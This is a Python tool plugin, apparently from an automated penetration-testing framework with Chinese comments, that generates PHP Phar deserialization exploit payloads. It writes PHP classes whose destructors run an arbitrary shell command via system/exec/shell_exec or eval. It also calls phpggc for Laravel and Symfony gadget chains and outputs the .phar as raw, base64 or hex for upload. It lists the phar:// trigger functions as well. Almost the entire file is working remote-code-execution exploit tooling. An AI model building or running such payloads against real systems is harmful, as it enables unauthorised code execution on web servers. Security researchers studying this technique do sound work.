# tools/phar_gen_tool.py
# Phar Generator - PHP Phar 反序列化 Payload 生成器
import os
import base64
import subprocess
import time
from typing import Dict, Any
from tool_framework import CommandLineTool


class PharGenTool(CommandLineTool):
    """
    Phar Generator - 真正生成 .phar 文件的反序列化 Payload 生成器
    支持：
    1. 自定义命令执行 payload
    2. phpggc 集成（生成特定框架 gadget）
    3. 多种输出格式 (phar, base64, hex)
    """

    # 输出目录
    OUTPUT_DIR = os.path.join("data", "tool_outputs")

    def __init__(self):
        super().__init__("php")
        self.timeout = 60
        os.makedirs(self.OUTPUT_DIR, exist_ok=True)

    def name(self) -> str:
        return "phar-gen"

    def description(self) -> str:
        return "PHP Phar 反序列化 Payload 生成器，真正创建 .phar 文件供上传使用"

    def supported_vulns(self) -> list:
        return ["Phar Deserialization", "PHP Object Injection", "File Inclusion", "Phar RCE"]

    def check_available(self) -> bool:
        import shutil
        return shutil.which("php") is not None

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "payload_type": {
                "type": "str",
                "description": "Payload 类型: 'system' (命令执行), 'eval' (代码执行), 'custom' (自定义类), 'phpggc' (使用 phpggc)",
                "required": False,
                "default": "system"
            },
            "command": {
                "type": "str",
                "description": "要执行的命令 (system/eval 类型)",
                "required": False,
                "default": "id"
            },
            "gadget": {
                "type": "str",
                "description": "phpggc gadget 链名称，如 'Laravel/RCE1', 'Symfony/RCE1' (payload_type=phpggc 时使用)",
                "required": False
            },
            "gadget_params": {
                "type": "str",
                "description": "phpggc 参数，如命令字符串",
                "required": False
            },
            "output_format": {
                "type": "str",
                "description": "输出格式: phar (二进制文件), base64, hex, all (全部生成)",
                "required": False,
                "default": "phar"
            },
            "filename": {
                "type": "str",
                "description": "输出文件名 (不含扩展名)，不填则自动生成",
                "required": False
            },
            "custom_class": {
                "type": "str",
                "description": "自定义 PHP 类代码 (payload_type=custom 时使用)",
                "required": False
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        payload_type = params.get("payload_type", "system")
        command = params.get("command", "id")
        gadget = params.get("gadget")
        gadget_params = params.get("gadget_params", command)
        output_format = params.get("output_format", "phar")
        filename = params.get("filename", f"phar_{int(time.time())}")
        custom_class = params.get("custom_class")

        try:
            # 生成唯一的临时目录，避免冲突
            temp_dir = os.path.join(self.OUTPUT_DIR, f"phar_temp_{int(time.time())}")
            os.makedirs(temp_dir, exist_ok=True)

            generated_files = []

            # 根据类型选择生成方式
            if payload_type == "phpggc" and gadget:
                # 使用 phpggc 生成
                result = self._generate_with_phpggc(gadget, gadget_params, temp_dir, output_format, filename)
                generated_files = result.get("files", [])
            else:
                # 使用内置模板生成
                result = self._generate_builtin(payload_type, command, custom_class, temp_dir, output_format, filename)
                generated_files = result.get("files", [])

            # 构建返回结果
            summary = f"Phar 文件已生成: {len(generated_files)} 个文件"

            return {
                "success": True,
                "vulnerable": True,
                "payload_type": payload_type,
                "output_format": output_format,
                "files": generated_files,
                "usage": {
                    "upload": "使用 requests 工具上传文件",
                    "trigger": "触发反序列化: phar:///path/to/exploit.phar"
                },
                "common_triggers": [
                    "file_exists('phar://...')",
                    "is_file('phar://...')",
                    "file_get_contents('phar://...')",
                    "include 'phar://...'",
                    "getimagesize('phar://...')",
                    "exif_read_data('phar://...')",
                    "fopen('phar://...')"
                ],
                "summary": summary
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "vulnerable": False,
                "summary": f"执行失败: {str(e)}"
            }

    def _generate_builtin(self, payload_type: str, command: str, custom_class: str,
                          temp_dir: str, output_format: str, filename: str) -> Dict:
        """使用内置模板生成 Phar 文件"""

        # 构建 PHP 类代码
        if payload_type == "custom" and custom_class:
            class_code = custom_class
            instantiation = "new CustomExploit();"
        elif payload_type == "eval":
            class_code = f'''class EvalExploit {{
    public $code = "{command}";
    public function __destruct() {{
        eval($this->code);
    }}
}}'''
            instantiation = "new EvalExploit();"
        else:  # system
            # 转义命令中的特殊字符
            escaped_cmd = command.replace("\\", "\\\\").replace('"', '\\"')
            class_code = f'''class SystemExploit {{
    public $cmd = "{escaped_cmd}";
    public function __destruct() {{
        if(function_exists("system")) {{
            system($this->cmd);
        }} elseif(function_exists("exec")) {{
            exec($this->cmd);
        }} elseif(function_exists("shell_exec")) {{
            shell_exec($this->cmd);
        }}
    }}
}}'''
            instantiation = "new SystemExploit();"

        # 构建完整的 PHP 脚本
        phar_path = os.path.join(temp_dir, f"{filename}.phar")
        php_script = f'''<?php
{class_code}

// 创建 phar 文件
@unlink("{phar_path}");
$phar = new Phar("{phar_path}");
$phar->startBuffering();
$phar->addFromString("index.php", "<?php echo 'test'; ?>");
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$obj = {instantiation}
$phar->setMetadata($obj);
$phar->stopBuffering();

// 输出生成结果
if(file_exists("{phar_path}")) {{
    echo "SUCCESS:" . filesize("{phar_path}");
}} else {{
    echo "FAILED";
}}
'''

        # 执行 PHP 脚本
        result = subprocess.run(
            ["php", "-d", "phar.readonly=0", "-r", php_script],
            capture_output=True,
            text=True,
            timeout=30,
            cwd=temp_dir
        )

        if "SUCCESS:" not in result.stdout:
            raise Exception(f"PHP 执行失败: {result.stderr or result.stdout}")

        # 处理输出文件
        generated_files = self._process_output(temp_dir, filename, output_format)

        return {"files": generated_files}

    def _generate_with_phpggc(self, gadget: str, gadget_params: str,
                              temp_dir: str, output_format: str, filename: str) -> Dict:
        """使用 phpggc 生成特定框架的 Phar Payload"""

        phpggc_path = "/app/thirdparty/phpggc/phpggc"

        if not os.path.exists(phpggc_path):
            raise Exception(f"phpggc 不存在: {phpggc_path}")

        # phpggc 生成 phar payload
        result = subprocess.run(
            ["php", phpggc_path, gadget, gadget_params, "--phar"],
            capture_output=True,
            text=True,
            timeout=60,
            cwd=temp_dir
        )

        if result.returncode != 0:
            raise Exception(f"phpggc 执行失败: {result.stderr}")

        # phpggc 输出到 stdout，需要保存
        phar_path = os.path.join(temp_dir, f"{filename}.phar")
        with open(phar_path, "wb") as f:
            f.write(result.stdout.encode('latin-1') if isinstance(result.stdout, str) else result.stdout)

        generated_files = self._process_output(temp_dir, filename, output_format)

        return {"files": generated_files}

    def _process_output(self, temp_dir: str, filename: str, output_format: str) -> list:
        """处理输出格式，返回文件列表"""

        phar_path = os.path.join(temp_dir, f"{filename}.phar")
        generated_files = []

        if not os.path.exists(phar_path):
            raise Exception(f"Phar 文件生成失败: {phar_path}")

        with open(phar_path, "rb") as f:
            phar_content = f.read()

        # 根据格式生成文件
        if output_format in ["phar", "all"]:
            dest_path = os.path.join(self.OUTPUT_DIR, f"{filename}.phar")
            with open(dest_path, "wb") as f:
                f.write(phar_content)
            generated_files.append({
                "format": "phar",
                "path": dest_path,
                "size": len(phar_content),
                "usage": "直接上传此文件"
            })

        if output_format in ["base64", "all"]:
            b64_content = base64.b64encode(phar_content).decode()
            dest_path = os.path.join(self.OUTPUT_DIR, f"{filename}.phar.b64")
            with open(dest_path, "w") as f:
                f.write(b64_content)
            generated_files.append({
                "format": "base64",
                "path": dest_path,
                "size": len(b64_content),
                "usage": "用于 base64 编码上传或数据注入"
            })

        if output_format in ["hex", "all"]:
            hex_content = phar_content.hex()
            dest_path = os.path.join(self.OUTPUT_DIR, f"{filename}.phar.hex")
            with open(dest_path, "w") as f:
                f.write(hex_content)
            generated_files.append({
                "format": "hex",
                "path": dest_path,
                "size": len(hex_content),
                "usage": "用于十六进制格式注入"
            })

        # 清理临时目录
        import shutil
        shutil.rmtree(temp_dir, ignore_errors=True)

        return generated_files